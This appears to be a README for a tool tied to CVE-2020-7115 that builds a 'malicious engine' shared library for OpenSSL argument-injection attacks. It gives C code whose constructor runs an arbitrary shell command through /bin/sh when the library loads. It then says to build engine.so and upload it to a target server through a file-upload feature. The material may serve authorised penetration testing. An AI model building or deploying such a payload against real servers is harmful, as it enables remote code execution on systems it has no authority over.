# CVE-2020-7115
Create your malicious engine in seconds

# build_engine.sh
Simple script to generate a **malicious engine** ready to be used in openssl [argument injection](https://www.acunetix.com/vulnerabilities/web/argument-injection/) scenarios.

## How to use?

It's very simple, just modify the engine.c file with the command of your choice:

```c
#include <unistd.h>

__attribute__((constructor))
static void init() {
    execl("/bin/sh", "sh", "-c", "COMMAND");
}
```

Once you have done that, now you just need to run the script like this:

```bash
bash build_engine.sh
```
This command will create a folder called output, in it you will find a file called ``engine.so` which is the one you should send to the server through a file upload functionality.
